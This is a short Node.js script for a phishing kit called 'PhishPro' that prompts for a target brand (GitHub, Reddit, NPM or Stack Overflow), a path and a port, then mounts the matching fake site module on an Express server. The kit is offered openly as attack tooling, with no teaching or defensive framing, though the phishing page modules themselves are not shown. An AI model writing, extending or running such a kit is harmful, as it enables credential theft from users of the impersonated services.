#!/usr/bin/env node

const express = require('express');
const app = express();
app.use(express.urlencoded({ extended: true }));
const prompt = require('prompt-sync')();
const chalk = require('chalk')

const formatnum = (num) => chalk.green("[") + chalk.red(num) + chalk.green("]")

console.log(`Welcome to ${chalk.cyan("PhishPro")}! Please choose from the following phish options: \n${formatnum("1")} Github\n${formatnum("2")} Reddit\n${formatnum("3")} NPM\n${formatnum("4")} Stack Overflow\n${formatnum("5")} Quit`)
const option = prompt('> ')
console.log("Please enter a path to place the phishing site on the server: ")
const path = prompt('> ')
console.log("Please enter a port to run the phishing site on: ")
const PORT = prompt('> ')

if (option == "1") {
    app.use(path, require('./sites/github/index.js'))
} else if (option == "2") {
    //
} else if (option == "3") {
    app.use(path, require('./sites/npm/index.js'))
} else if (option == "4") {
    app.use(path, require('./sites/stackoverflow/index.js'))
}

app.listen(PORT, () => {
    console.log(chalk.green(`PhishPro is running on port ${PORT}!`))
})